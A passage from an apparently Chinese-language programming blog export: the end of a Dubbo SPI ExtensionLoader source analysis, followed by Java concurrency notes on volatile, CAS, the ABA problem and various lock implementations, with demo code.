boolean overridden) throws NoSuchMethodException { if (!type.isAssignableFrom(clazz)) { throw new IllegalStateException(&quot;Error occurred when loading extension class (interface: &quot; + type + &quot;, class line: &quot; + clazz.getName() + &quot;), class &quot; + clazz.getName() + &quot; is not subtype of interface.&quot;); } // 处理Adaptive注解，若存在则将该实现类保存至cachedAdaptiveClass属性 if (clazz.isAnnotationPresent(Adaptive.class)) { cacheAdaptiveClass(clazz, overridden); } // 是否为包装类，是包装类缓存到 cachedWrapperClasses Set中 else if (isWrapperClass(clazz)) { cacheWrapperClass(clazz); } else { clazz.getConstructor(); if (StringUtils.isEmpty(name)) { name = findAnnotationName(clazz); if (name.length() == 0) { throw new IllegalStateException(&quot;No such extension name for the class &quot; + clazz.getName() + &quot; in the config &quot; + resourceURL); } } // key可以为多个，如：mysqlDriver,mysqlDriver2=com.cuzz.mysql.MysqlDriver String[] names = NAME_SEPARATOR.split(name); if (ArrayUtils.isNotEmpty(names)) { // 缓存到 cachedActivates 属性中 cacheActivateClass(clazz, names[0]); for (String n : names) { // 缓存了该 ExtensionLoader 加载的扩展实现类与扩展名之间的映射关系。 cacheName(clazz, n); // 加载的扩展名与扩展实现类之间的映射关系 saveInExtensionClass(extensionClasses, clazz, n, overridden); } } }}private void cacheAdaptiveClass(Class&lt;?&gt; clazz, boolean overridden) { if (cachedAdaptiveClass == null || overridden) { cachedAdaptiveClass = clazz; } else if (!cachedAdaptiveClass.equals(clazz)) { throw new IllegalStateException(&quot;More than 1 adaptive class found: &quot; + cachedAdaptiveClass.getName() + &quot;, &quot; + clazz.getName()); }} Dubbo SPI 的自动包装和自动注入回到前面我们分析ExtensionLoader#createExtension方法，现在我们重点关注 ExtensionLoader#injectExtension 方法 private T createExtension(String name) { // 获取 cachedClasses 缓存，根据扩展名从 cachedClasses 缓存中获取扩展实现类。 Class&lt;?&gt; clazz = getExtensionClasses().get(name); if (clazz == null) { throw findException(name); } try { // 根据扩展实现类从 EXTENSION_INSTANCES 缓存中查找相应的实例。如果查找失败，会通过反射创建扩展实现对象。 T instance = (T) EXTENSION_INSTANCES.get(clazz); if (instance == null) { EXTENSION_INSTANCES.putIfAbsent(clazz, clazz.newInstance()); instance = (T) EXTENSION_INSTANCES.get(clazz); } // 自动装配扩展实现对象中的属性（即调用其 setter）。这里涉及 ExtensionFactory 以及自动装配的相关内容。 injectExtension(instance); // ---&gt; // 自动包装扩展实现对象。这里涉及 Wrapper 类以及自动包装特性的相关内容。 Set&lt;Class&lt;?&gt;&gt; wrapperClasses = cachedWrapperClasses; if (CollectionUtils.isNotEmpty(wrapperClasses)) { // 遍历所有的包装类，包装类需要有一个参数类被包装类型的构造器。 for (Class&lt;?&gt; wrapperClass : wrapperClasses) { instance = injectExtension((T) wrapperClass.getConstructor(type).newInstance(instance)); } } // 如果扩展实现类实现了 Lifecycle 接口，在 initExtension() 方法中会调用 initialize() 方法进行初始化。 initExtension(instance); return instance; } catch (Throwable t) { throw new IllegalStateException(&quot;Extension instance (name: &quot; + name + &quot;, class: &quot; + type + &quot;) couldn't be instantiated: &quot; + t.getMessage(), t); }} ExtensionLoader#injectExtension private T injectExtension(T instance) { if (objectFactory == null) { return instance; } try { for (Method method : instance.getClass().getMethods()) { // 判断是否为set方法 if (!isSetter(method)) { continue; } // 如果有 @DisableInject 注解也不注入 if (method.getAnnotation(DisableInject.class) != null) { continue; } // 获取参数类型，如果是基本类型也忽略 Class&lt;?&gt; pt = method.getParameterTypes()[0]; if (ReflectUtils.isPrimitives(pt)) { continue; } try { // 根据 Setter 方法获取属性名 String property = getSetterProperty(method); // 加载这个类，并实例化 Object object = objectFactory.getExtension(pt, property); if (object != null) { // 反射注入 method.invoke(instance, object); } } catch (Exception e) { logger.error(&quot;Failed to inject via method &quot; + method.getName() + &quot; of interface &quot; + type.getName() + &quot;: &quot; + e.getMessage(), e); } } } catch (Exception e) { logger.error(e.getMessage(), e); } return instance;} Dubbo SPI 的 @Adaptive 注解与适配器在dubbo扩展中，适配器模式被广泛使用，其作用在于为同一扩展类型下的多个扩展实现的调用提供路由功能，如指定优先级等。dubbo提供了两种方式来生成扩展适配器： 静态代码形式的默认适配器：这些类会被Adaptive注解修饰，且一个接口只能有一个这样的静态适配器。这种形式仅应用于一些特殊的接口，如：AdaptiveCompiler、AdaptiveExtensionFactory这两个适配器，ExtensionLoader需要依赖它们来工作，所以使用了这种特殊的构建方式。 动态代码适配器：实际上其余的接口都是使用动态适配器，ExtensionLoader 根据接口定义动态生成一段适配器代码，并构建这个动态类的实例。这个时候接口中的一些方法具有 Adaptive 标记，它提供了一些用于查找具体 Extension 的key，如果这些方法中有URL类型的参数，则会依次在url中查找这些key对应的value，再以此为 name 确定要使用的 Extension。如果没有从url中找到该参数，则会使用 SPI 注解中的默认值 name 进行构建。 我们回到构造方法中ExtensionLoader#getAdaptiveExtension private ExtensionLoader(Class&lt;?&gt; type) { this.type = type; // 初始化拓展适配器 objectFactory = (type == ExtensionFactory.class ? null : ExtensionLoader.getExtensionLoader(ExtensionFactory.class).getAdaptiveExtension());} ExtensionLoader#getAdaptiveExtension public T getAdaptiveExtension() { // 先从缓存中获取 Object instance = cachedAdaptiveInstance.get(); if (instance == null) { if (createAdaptiveInstanceError != null) { throw new IllegalStateException(&quot;Failed to create adaptive instance: &quot; + createAdaptiveInstanceError.toString(), createAdaptiveInstanceError); } synchronized (cachedAdaptiveInstance) { instance = cachedAdaptiveInstance.get(); if (instance == null) { try { // 创建 instance = createAdaptiveExtension(); // ---&gt; 1 cachedAdaptiveInstance.set(instance); } catch (Throwable t) { createAdaptiveInstanceError = t; throw new IllegalStateException(&quot;Failed to create adaptive instance: &quot; + t.toString(), t); } } } } return (T) instance;}private T createAdaptiveExtension() { try { // 注入属性 return injectExtension((T) getAdaptiveExtensionClass().newInstance()); // ---&gt; 2 } catch (Exception e) { throw new IllegalStateException(&quot;Can't create adaptive extension &quot; + type + &quot;, cause: &quot; + e.getMessage(), e); }}private Class&lt;?&gt; getAdaptiveExtensionClass() { getExtensionClasses(); if (cachedAdaptiveClass != null) { return cachedAdaptiveClass; } return cachedAdaptiveClass = createAdaptiveExtensionClass(); // ---&gt; 3}private Class&lt;?&gt; createAdaptiveExtensionClass() { // 创建适配器类，并继承 type 接口 String code = new AdaptiveClassCodeGenerator(type, cachedDefaultName).generate(); // ---&gt; 4 ClassLoader classLoader = findClassLoader(); // ExtensionLoader再调用默认的JavassitCompiler进行编译和类加载 org.apache.dubbo.common.compiler.Compiler compiler = ExtensionLoader.getExtensionLoader(org.apache.dubbo.common.compiler.Compiler.class).getAdaptiveExtension(); return compiler.compile(code, classLoader);} ExtensionLoader#createAdaptiveExtensionClass 以 Transsporter为例子 @SPI(&quot;netty&quot;) public interface Transporter { @Adaptive({Constants.SERVER_KEY, Constants.TRANSPORTER_KEY}) RemotingServer bind(URL url, ChannelHandler handler) throws RemotingException; @Adaptive({Constants.CLIENT_KEY, Constants.TRANSPORTER_KEY}) Client connect(URL url, ChannelHandler handler) throws RemotingException; } Dubbo 会生成一个 Transporter$Adaptive 适配器类，该类继承了 Transporter 接口： public class Transporter$Adaptive implements Transporter { public org.apache.dubbo.remoting.Client connect(URL arg0, ChannelHandler arg1) throws RemotingException { // 必须传递URL参数 if (arg0 == null) throw new IllegalArgumentException(&quot;url == null&quot;); URL url = arg0; // 确定扩展名，优先从URL中的client参数获取，其次是transporter参数 // 这两个参数名称由@Adaptive注解指定，最后是@SPI注解中的默认值 String extName = url.getParameter(&quot;client&quot;, url.getParameter(&quot;transporter&quot;, &quot;netty&quot;)); if (extName == null) throw new IllegalStateException(&quot;...&quot;); // 通过ExtensionLoader加载Transporter接口的指定扩展实现 Transporter extension = (Transporter) ExtensionLoader .getExtensionLoader(Transporter.class) .getExtension(extName); return extension.connect(arg0, arg1); } ... // 省略bind()方法 } Dubbo SPI 的 @Activate注解与自动激活特性这里以 Dubbo 中的 Filter 为例说明自动激活特性的含义，org.apache.dubbo.rpc.Filter 接口有非常多的扩展实现类，在一个场景中可能需要某几个 Filter 扩展实现类协同工作，而另一个场景中可能需要另外几个实现类一起工作。这样，就需要一套配置来指定当前场景中哪些 Filter 实现是可用的，这就是 @Activate 注解要做的事情。 @Activate 注解标注在扩展实现类上，有 group、value 以及 order 三个属性。 group 属性：修饰的实现类是在 Provider 端被激活还是在 Consumer 端被激活。 value 属性：修饰的实现类只在 URL 参数中出现指定的 key 时才会被激活。 order 属性：用来确定扩展实现类的排序。 如 Filter 接口和实现类： @SPIpublic interface Filter { Result invoke(Invoker&lt;?&gt; invoker, Invocation invocation) throws RpcException;1}@Activate(group = Constants.PROVIDER)public class TimeoutFilter implements Filter { ...}@Activate(group = {Constants.PROVIDER, Constants.CONSUMER})public class MonitorFilter implements Filter { ...} 首先来关注 getActivateExtension() 方法的参数：url 中包含了配置信息，values 是配置中指定的扩展名，group 为 Provider 或 Consumer。 public List&lt;T&gt; getActivateExtension(URL url, String[] values, String group) { List&lt;T&gt; activateExtensions = new ArrayList&lt;&gt;(); // values配置就是扩展名 List&lt;String&gt; names = values == null ? new ArrayList&lt;&gt;(0) : asList(values); if (!names.contains(REMOVE_VALUE_PREFIX + DEFAULT_KEY)) {// ---1 getExtensionClasses(); // 触发cachedActivates等缓存字段的加载 for (Map.Entry&lt;String, Object&gt; entry : cachedActivates.entrySet()) { String name = entry.getKey(); // 扩展名 Object activate = entry.getValue(); // @Activate注解 String[] activateGroup, activateValue; if (activate instanceof Activate) { // @Activate注解中的配置 activateGroup = ((Activate) activate).group(); activateValue = ((Activate) activate).value(); } else { continue; } if (isMatchGroup(group, activateGroup) // 匹配group // 没有出现在values配置中的，即为默认激活的扩展实现 &amp;&amp; !names.contains(name) // 通过&quot;-&quot;明确指定不激活该扩展实现 &amp;&amp; !names.contains(REMOVE_VALUE_PREFIX + name) // 检测URL中是否出现了指定的Key &amp;&amp; isActive(activateValue, url)) { // 加载扩展实现的实例对象，这些都是激活的 activateExtensions.add(getExtension(name)); } } // 排序 --- 2 activateExtensions.sort(ActivateComparator.COMPARATOR); } List&lt;T&gt; loadedExtensions = new ArrayList&lt;&gt;(); for (int i = 0; i &lt; names.size(); i++) { // ---3 String name = names.get(i); // 通过&quot;-&quot;开头的配置明确指定不激活的扩展实现，直接就忽略了 if (!name.startsWith(REMOVE_VALUE_PREFIX) &amp;&amp; !names.contains(REMOVE_VALUE_PREFIX + name)) { if (DEFAULT_KEY.equals(name)) { if (!loadedExtensions.isEmpty()) { // 按照顺序，将自定义的扩展添加到默认扩展集合前面 activateExtensions.addAll(0, loadedExtensions); loadedExtensions.clear(); } } else { loadedExtensions.add(getExtension(name)); } } } if (!loadedExtensions.isEmpty()) { // 按照顺序，将自定义的扩展添加到默认扩展集合后面 activateExtensions.addAll(loadedExtensions); } return activateExtensions; } 总结本文总结了 JDK SPI 和 Dubbo SPI 机制和原理，参考了很多文章，以下几点需要值得注意： JDK SPI 需要对加载实例化所有的推展对象，而 Dubbo SPI 根据 KV 形式，只需要实例化需要的拓展。 Dubbo SPI 对 JDK SPI 拓展了自动注入、自动注入以及自动激活等特性。 参考 Dubbo官网-Dubbo SPI Dubbo SPI 精析 Dubbo源码解读全集 聊聊Dubbo（五）：核心源码-SPI扩展 Dubbo源码分析（五）ExtensionLoader","link":"/2020/08/26/Dubbo_SPI%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"title":"Java 并发编程","text":"请谈谈你对 volatile 的理解volatile 是 Java 虚拟机提供的轻量级的同步机制 保证可见性 禁止指令排序 不保证原子性 JMM（Java 内存模型） JMM 本身是一种抽象的概念并不是真实存在，它描述的是一组规定或则规范，通过这组规范定义了程序中的访问方式。 JMM 同步规定 线程解锁前，必须把共享变量的值刷新回主内存 线程加锁前，必须读取主内存的最新值到自己的工作内存 加锁解锁是同一把锁 由于 JVM 运行程序的实体是线程，而每个线程创建时 JVM 都会为其创建一个工作内存，工作内存是每个线程的私有数据区域，而 Java 内存模型中规定所有变量的储存在主内存，主内存是共享内存区域，所有的线程都可以访问，但线程对变量的操作（读取赋值等）必须都工作内存进行看。 首先要将变量从主内存拷贝的自己的工作内存空间，然后对变量进行操作，操作完成后再将变量写回主内存，不能直接操作主内存中的变量，工作内存中存储着主内存中的变量副本拷贝，前面说过，工作内存是每个线程的私有数据区域，因此不同的线程间无法访问对方的工作内存，线程间的通信(传值)必须通过主内存来完成。 内存模型图 三大特性： 可见性 原子性 有序性 （1）可见性，如果不加 volatile 关键字，则主线程会进入死循环，加 volatile 则主线程能够退出，说明加了 volatile 关键字变量，当有一个线程修改了值，会马上被另一个线程感知到，当前值作废，从新从主内存中获取值。对其他线程可见，这就叫可见性。 /** * @Author: cuzz * @Date: 2019/4/16 21:29 * @Description: 可见性代码实例 */public class VolatileDemo { public static void main(String[] args) { Data data = new Data(); new Thread(() -&gt; { System.out.println(Thread.currentThread().getName() + &quot; coming...&quot;); try { Thread.sleep(3000); } catch (InterruptedException e) { e.printStackTrace(); } data.addOne(); // 调用 System.out.println(Thread.currentThread().getName() + &quot; updated...&quot;); }).start(); while (data.a == 0) { // looping } System.out.println(Thread.currentThread().getName() + &quot; job is done...&quot;); }}class Data { // int a = 0; volatile int a = 0; void addOne() { this.a += 1; }} （2）原子性，发现下面输出不能得到 20000。 public class VolatileDemo { public static void main(String[] args) { // test01(); test02(); } // 测试原子性 private static void test02() { Data data = new Data(); for (int i = 0; i &lt; 20; i++) { new Thread(() -&gt; { for (int j = 0; j &lt; 1000; j++) { data.addOne(); } }).start(); } // 默认有 main 线程和 gc 线程 while (Thread.activeCount() &gt; 2) { Thread.yield(); } System.out.println(data.a); }}class Data { volatile int a = 0; void addOne() { this.a += 1; }} （3）有序性 计算机在执行程序时，为了提高性能，编译器个处理器常常会对指令做重排，一般分为以下 3 种 编译器优化的重排 指令并行的重排 内存系统的重排 单线程环境里面确保程序最终执行的结果和代码执行的结果一致 处理器在进行重排序时必须考虑指令之间的数据依赖性 多线程环境中线程交替执行，由于编译器优化重排的存在，两个线程中使用的变量能否保证用的变量能否一致性是无法确定的，结果无法预测 代码示例 public class ReSortSeqDemo { int a = 0; boolean flag = false; public void method01() { a = 1; // flag = true; // ----线程切换---- flag = true; // a = 1; } public void method02() { if (flag) { a = a + 3; System.out.println(&quot;a = &quot; + a); } }} 如果两个线程同时执行，method01 和 method02 如果线程 1 执行 method01 重排序了，然后切换的线程 2 执行 method02 就会出现不一样的结果。 禁止指令排序 volatile 实现禁止指令重排序的优化，从而避免了多线程环境下程序出现乱序的现象 先了解一个概念，内存屏障（Memory Barrier）又称内存栅栏，是一个 CPU 指令，他的作用有两个： 保证特定操作的执行顺序 保证某些变量的内存可见性（利用该特性实现 volatile 的内存可见性） 由于编译器个处理器都能执行指令重排序优化，如果在指令间插入一条 Memory Barrier 则会告诉编译器和 CPU，不管什么指令都不能个这条 Memory Barrier 指令重排序，也就是说通过插入内存屏障禁止在内存屏障前后执行重排序优化。内存屏障另一个作用是强制刷出各种 CPU 缓存数据，因此任何 CPU 上的线程都能读取到这些数据的最新版本。 下面是保守策略下，volatile写插入内存屏障后生成的指令序列示意图： 下面是在保守策略下，volatile读插入内存屏障后生成的指令序列示意图： 线程安全性保证 工作内存与主内存同步延迟现象导致可见性问题 可以使用 synchronzied 或 volatile 关键字解决，它们可以使用一个线程修改后的变量立即对其他线程可见 对于指令重排导致可见性问题和有序性问题 可以利用 volatile 关键字解决，因为 volatile 的另一个作用就是禁止指令重排序优化 你在哪些地方用到过 volatile？单例 多线程环境下可能存在的安全问题，发现构造器里的内容会多次输出 @NotThreadSafepublic class Singleton01 { private static Singleton01 instance = null; private Singleton01() { System.out.println(Thread.currentThread().getName() + &quot; construction...&quot;); } public static Singleton01 getInstance() { if (instance == null) { instance = new Singleton01(); } return instance; } public static void main(String[] args) { ExecutorService executorService = Executors.newFixedThreadPool(10); for (int i = 0; i &lt; 10; i++) { executorService.execute(()-&gt; Singleton01.getInstance()); } executorService.shutdown(); }} 双重锁单例 public class Singleton02 { private static volatile Singleton02 instance = null; private Singleton02() { System.out.println(Thread.currentThread().getName() + &quot; construction...&quot;); } public static Singleton02 getInstance() { if (instance == null) { synchronized (Singleton01.class) { if (instance == null) { instance = new Singleton02(); } } } return instance; } public static void main(String[] args) { ExecutorService executorService = Executors.newFixedThreadPool(10); for (int i = 0; i &lt; 10; i++) { executorService.execute(()-&gt; Singleton02.getInstance()); } executorService.shutdown(); }} 如果没有加 volatile 就不一定是线程安全的，原因是指令重排序的存在，加入 volatile 可以禁止指令重排。原因是在于某一个线程执行到第一次检测，读取到的 instance 不为 null 时，instance 的引用对象可能还没有完成初始化。instance = new Singleton() 可以分为以下三步完成。 memory = allocate(); // 1.分配对象空间instance(memory); // 2.初始化对象instance = memory; // 3.设置instance指向刚分配的内存地址，此时instance != null 步骤 2 和步骤 3 不存在依赖关系，而且无论重排前还是重排后程序的执行结果在单线程中并没有改变，因此这种优化是允许的，发生重排。 memory = allocate(); // 1.分配对象空间instance = memory; // 3.设置instance指向刚分配的内存地址，此时instance != null，但对象还没有初始化完成instance(memory); // 2.初始化对象 所以不加 volatile 返回的实例不为空，但可能是未初始化的实例 CAS 你知道吗？CAS 底层原理？谈谈对 UnSafe 的理解？public class CASDemo { public static void main(String[] args) { AtomicInteger atomicInteger = new AtomicInteger(666); // 获取真实值，并替换为相应的值 boolean b = atomicInteger.compareAndSet(666, 2019); System.out.println(b); // true boolean b1 = atomicInteger.compareAndSet(666, 2020); System.out.println(b1); // false atomicInteger.getAndIncrement(); }} getAndIncrement()方法 /*** Atomically increments by one the current value.** @return the previous value*/public final int getAndIncrement() { return unsafe.getAndAddInt(this, valueOffset, 1);} 引出一个问题：UnSafe 类是什么？我们先看看AtomicInteger 就使用了Unsafe 类。 public class AtomicInteger extends Number implements java.io.Serializable { private static final long serialVersionUID = 6214790243416807050L; // setup to use Unsafe.compareAndSwapInt for updates private static final Unsafe unsafe = Unsafe.getUnsafe(); private static final long valueOffset; static { try { // 获取下面 value 的地址偏移量 valueOffset = unsafe.objectFieldOffset (AtomicInteger.class.getDeclaredField(&quot;value&quot;)); } catch (Exception ex) { throw new Error(ex); } } private volatile int value; // ...} Unsafe类： Unsafe 是 CAS 的核心类，由于 Java 方法无法直接访问底层系统，而需要通过本地（native）方法来访问， Unsafe 类相当一个后门，基于该类可以直接操作特定内存的数据。Unsafe 类存在于 sun.misc 包中，其内部方法操作可以像 C 指针一样直接操作内存，因为 Java 中 CAS 操作执行依赖于 Unsafe 类。 变量 vauleOffset，表示该变量值在内存中的偏移量，因为 Unsafe 就是根据内存偏移量来获取数据的。 变量 value 用 volatile 修饰，保证了多线程之间的内存可见性。 CAS 是什么？ CAS 的全称 Compare-And-Swap，它是一条 CPU 并发。 它的功能是判断内存某一个位置的值是否为预期，如果是则更改这个值，这个过程就是原子的。 CAS 并发原体现在 JAVA 语言中就是 sun.misc.Unsafe 类中的各个方法。调用 UnSafe 类中的 CAS 方法，JVM 会帮我们实现出 CAS 汇编指令。这是一种完全依赖硬件的功能，通过它实现了原子操作。由于 CAS 是一种系统源语，源语属于操作系统用语范畴，是由若干条指令组成，用于完成某一个功能的过程，并且原语的执行必须是连续的，在执行的过程中不允许被中断，也就是说 CAS 是一条原子指令，不会造成所谓的数据不一致的问题。 分析一下 getAndAddInt 这个方法 // unsafe.getAndAddIntpublic final int getAndAddInt(Object obj, long valueOffset, long expected, int val) { int temp; do { temp = this.getIntVolatile(obj, valueOffset); // 获取快照值 } while (!this.compareAndSwap(obj, valueOffset, temp, temp + val)); // 如果此时 temp 没有被修改，就能退出循环，否则重新获取 return temp;} CAS 的缺点？ 循环时间长开销很大 如果 CAS 失败，会一直尝试，如果 CAS 长时间一直不成功，可能会给 CPU 带来很大的开销（比如线程数很多，每次比较都是失败，就会一直循环），所以希望是线程数比较小的场景。 只能保证一个共享变量的原子操作 对于多个共享变量操作时，循环 CAS 就无法保证操作的原子性。 引出 ABA 问题 原子类 AtomicInteger 的 ABA 问题谈一谈？原子更新引用知道吗？原子引用 public class AtomicReferenceDemo { public static void main(String[] args) { User cuzz = new User(&quot;cuzz&quot;, 18); User faker = new User(&quot;faker&quot;, 20); AtomicReference&lt;User&gt; atomicReference = new AtomicReference&lt;&gt;(); atomicReference.set(cuzz); System.out.println(atomicReference.compareAndSet(cuzz, faker)); // true System.out.println(atomicReference.get()); // User(userName=faker, age=20) }} ABA 问题是怎么产生的 /** * @program: learn-demo * @description: ABA * @author: cuzz * @create: 2019-04-21 23:31 **/public class ABADemo { private static AtomicReference&lt;Integer&gt; atomicReference = new AtomicReference&lt;&gt;(100); public static void main(String[] args) { new Thread(() -&gt; { atomicReference.compareAndSet(100, 101); atomicReference.compareAndSet(101, 100); }).start(); new Thread(() -&gt; { // 保证上面线程先执行 try { Thread.sleep(1000); } catch (InterruptedException e) { e.printStackTrace(); } atomicReference.compareAndSet(100, 2019); System.out.println(atomicReference.get()); // 2019 }).start(); }} 当有一个值从 A 改为 B 又改为 A，这就是 ABA 问题。 时间戳原子引用 package com.cuzz.thread;import java.util.concurrent.atomic.AtomicReference;import java.util.concurrent.atomic.AtomicStampedReference;/** * @description: ABA * @author: cuzz * @create: 2019-04-21 23:31 **/public class ABADemo2 { private static AtomicStampedReference&lt;Integer&gt; atomicStampedReference = new AtomicStampedReference&lt;&gt;(100, 1); public static void main(String[] args) { new Thread(() -&gt; { int stamp = atomicStampedReference.getStamp(); System.out.println(Thread.currentThread().getName() + &quot; 的版本号为：&quot; + stamp); try { Thread.sleep(1000); } catch (InterruptedException e) { e.printStackTrace(); } atomicStampedReference.compareAndSet(100, 101, atomicStampedReference.getStamp(), atomicStampedReference.getStamp() + 1 ); atomicStampedReference.compareAndSet(101, 100, atomicStampedReference.getStamp(), atomicStampedReference.getStamp() + 1 ); }).start(); new Thread(() -&gt; { int stamp = atomicStampedReference.getStamp(); System.out.println(Thread.currentThread().getName() + &quot; 的版本号为：&quot; + stamp); try { Thread.sleep(3000); } catch (InterruptedException e) { e.printStackTrace(); } boolean b = atomicStampedReference.compareAndSet(100, 2019, stamp, stamp + 1); System.out.println(b); // false System.out.println(atomicStampedReference.getReference()); // 100 }).start(); }} 我们先保证两个线程的初始版本为一致，后面修改是由于版本不一样就会修改失败。 我们知道 ArrayList 是线程不安全，请编写一个不安全的案例并给出解决方案？故障现象 public class ContainerDemo { public static void main(String[] args) { List&lt;Integer&gt; list = new ArrayList&lt;&gt;(); Random random = new Random(); for (int i = 0; i &lt; 100; i++) { new Thread(() -&gt; { list.add(random.nextInt(10)); System.out.println(list); }).start(); } }} 发现报 java.util.ConcurrentModificationException 导致原因 并发修改导致的异常 解决方案 new Vector(); Collections.synchronizedList(new ArrayList&lt;&gt;()); new CopyOnWriteArrayList&lt;&gt;(); 优化建议 在读多写少的时候推荐使用 CopeOnWriteArrayList 这个类 java 中锁你知道哪些？请手写一个自旋锁？1、公平和非公平锁 是什么 公平锁：是指多个线程按照申请的顺序来获取值 非公平锁：是值多个线程获取值的顺序并不是按照申请锁的顺序，有可能后申请的线程比先申请的线程优先获取锁，在高并发的情况下，可能会造成优先级翻转或者饥饿现象 两者区别 公平锁：在并发环境中，每一个线程在获取锁时会先查看此锁维护的等待队列，如果为空，或者当前线程是等待队列的第一个就占有锁，否者就会加入到等待队列中，以后会按照 FIFO 的规则获取锁 非公平锁：一上来就尝试占有锁，如果失败在进行排队 2、可重入锁和不可重入锁 是什么 可重入锁：指的是同一个线程外层函数获得锁之后，内层仍然能获取到该锁，在同一个线程在外层方法获取锁的时候，在进入内层方法或会自动获取该锁 不可重入锁： 所谓不可重入锁，即若当前线程执行某个方法已经获取了该锁，那么在方法中尝试再次获取锁时，就会获取不到被阻塞 代码实现 可重入锁 public class ReentrantLock { boolean isLocked = false; Thread lockedBy = null; int lockedCount = 0; public synchronized void lock() throws InterruptedException { Thread thread = Thread.currentThread(); while (isLocked &amp;&amp; lockedBy != thread) { wait(); } isLocked = true; lockedCount++; lockedBy = thread; } public synchronized void unlock() { if (Thread.currentThread() == lockedBy) { lockedCount--; if (lockedCount == 0) { isLocked = false; notify(); } } }} 测试 public class Count {// NotReentrantLock lock = new NotReentrantLock(); ReentrantLock lock = new ReentrantLock(); public void print() throws InterruptedException{ lock.lock(); doAdd(); lock.unlock(); } private void doAdd() throws InterruptedException { lock.lock(); // do something System.out.println(&quot;ReentrantLock&quot;); lock.unlock(); } public static void main(String[] args) throws InterruptedException { Count count = new Count(); count.print(); }} 发现可以输出 ReentrantLock，我们设计两个线程调用 print() 方法，第一个线程调用 print() 方法获取锁，进入 lock() 方法，由于初始 lockedBy 是 null，所以不会进入 while 而挂起当前线程，而是是增量 lockedCount 并记录 lockBy 为第一个线程。接着第一个线程进入 doAdd() 方法，由于同一进程，所以不会进入 while 而挂起，接着增量 lockedCount，当第二个线程尝试lock，由于 isLocked=true，所以他不会获取该锁，直到第一个线程调用两次 unlock() 将 lockCount 递减为0，才将标记为 isLocked 设置为 false。 不可重入锁 public class NotReentrantLock { private boolean isLocked = false; public synchronized void lock() throws InterruptedException { while (isLocked) { wait(); } isLocked = true; } public synchronized void unlock() { isLocked = false; notify(); }} 测试 public class Count { NotReentrantLock lock = new NotReentrantLock(); public void print() throws InterruptedException{ lock.lock(); doAdd(); lock.unlock(); } private void doAdd() throws InterruptedException { lock.lock(); // do something lock.unlock(); } public static void main(String[] args) throws InterruptedException { Count count = new Count(); count.print(); }} 当前线程执行print()方法首先获取lock，接下来执行doAdd()方法就无法执行doAdd()中的逻辑，必须先释放锁。这个例子很好的说明了不可重入锁。 synchronized 和 ReentrantLock 都是可重入锁 synchronzied public class SynchronziedDemo { private synchronized void print() { doAdd(); } private synchronized void doAdd() { System.out.println(&quot;doAdd...&quot;); } public static void main(String[] args) { SynchronziedDemo synchronziedDemo = new SynchronziedDemo(); synchronziedDemo.print(); // doAdd... }} 上面可以说明 synchronized 是可重入锁。 ReentrantLock public class ReentrantLockDemo { private Lock lock = new ReentrantLock(); private void print() { lock.lock(); doAdd(); lock.unlock(); } private void doAdd() { lock.lock(); lock.lock(); System.out.println(&quot;doAdd...&quot;); lock.unlock(); lock.unlock(); } public static void main(String[] args) { ReentrantLockDemo reentrantLockDemo = new ReentrantLockDemo(); reentrantLockDemo.print(); }} 上面例子可以说明 ReentrantLock 是可重入锁，而且在 #doAdd 方法中加两次锁和解两次锁也可以。 3、自旋锁 是指定尝试获取锁的线程不会立即堵塞，而是采用循环的方式去尝试获取锁，这样的好处是减少线程上线文切换的消耗，缺点就是循环会消耗 CPU。 手动实现自旋锁 public class SpinLock { private AtomicReference&lt;Thread&gt; atomicReference = new AtomicReference&lt;&gt;(); private void lock () { System.out.println(Thread.currentThread() + &quot; coming...&quot;); while (!atomicReference.compareAndSet(null, Thread.currentThread())) { // loop } } private void unlock() { Thread thread = Thread.currentThread(); atomicReference.compareAndSet(thread, null); System.out.println(thread + &quot; unlock...&quot;); } public static void main(String[] args) throws InterruptedException { SpinLock spinLock = new SpinLock(); new Thread(() -&gt; { spinLock.lock(); try { Thread.sleep(3000); } catch (InterruptedException e) { e.printStackTrace(); } System.out.println(&quot;hahaha&quot;); spinLock.unlock(); }).start(); Thread.sleep(1); new Thread(() -&gt; { spinLock.lock(); System.out.println(&quot;hehehe&quot;); spinLock.unlock(); }).start(); }} 输出： Thread[Thread-0,5,main] coming...Thread[Thread-1,5,main] coming...hahahaThread[Thread-0,5,main] unlock...heheheThread[Thread-1,5,main] unlock... 获取锁的时候，如果原子引用为空就获取锁，不为空表示有人获取了锁，就循环等待。 4、独占锁（写锁）/共享锁（读锁） 是什么 独占锁：指该锁一次只能被一个线程持有 共享锁：该锁可以被多个线程持有 对于 ReentrantLock 和 synchronized 都是独占锁；对与 ReentrantReadWriteLock 其读锁是共享锁而写锁是独占锁。读锁的共享可保证并发读是非常高效的，读写、写读和写写的过程是互斥的。 读写锁例子 public class MyCache { private volatile Map&lt;String, Object&gt; map = new HashMap&lt;&gt;(); private ReentrantReadWriteLock lock = new ReentrantReadWriteLock(); WriteLock writeLock = lock.writeLock(); ReadLock readLock = lock.readLock(); public void put(String key, Object value) { try { writeLock.lock(); System.out.println(Thread.currentThread().getName() + &quot; 正在写入...&quot;); try { Thread.sleep(1000); } catch (InterruptedException e) { e.printStackTrace(); } map.put(key, value); System.out.println(Thread.currentThread().getName() + &quot; 写入完成，写入结果是 &quot; + value); } finally { writeLock.unlock(); } } public void get(String key) { try { readLock.lock(); System.out.println(Thread.currentThread().getName() + &quot; 正在读...&quot;); try { Thread.sleep(1000); } catch (InterruptedException e) { e.printStackTrace(); } Object res = map.get(key); System.out.println(Thread.currentThread().getName() + &quot; 读取完成，读取结果是 &quot; + res); } finally { readLock.unlock(); } }} 测试 public class ReadWriteLockDemo { public static void main(String[] args) { MyCache cache = new MyCache(); for (int i = 0; i &lt; 5; i++) { final int temp = i; new Thread(() -&gt; { cache.put(temp + &quot;&quot;, temp + &quot;&quot;); }).start(); } for (int i = 0; i &lt; 5; i++) { final int temp = i; new Thread(() -&gt; { cache.get(temp + &quot;&quot;); }).start(); } }} 输出结果 Thread-0 正在写入...Thread-0 写入完成，写入结果是 0Thread-1 正在写入...Thread-1 写入完成，写入结果是 1Thread-2 正在写入...Thread-2 写入完成，写入结果是 2Thread-3 正在写入...Thread-3 写入完成，写入结果是 3Thread-4 正在写入...Thread-4 写入完成，写入结果是 4Thread-5 正在读...Thread-7 正在读...Thread-8 正在读...Thread-6 正在读...Thread-9 正在读...Thread-5 读取完成，读取结果是 0Thread-7 读取完成，读取结果是 2Thread-8 读取完成，读取结果是 3Thread-6 读取完成，读取结果是 1Thread-9 读取完成，读取结果是 4 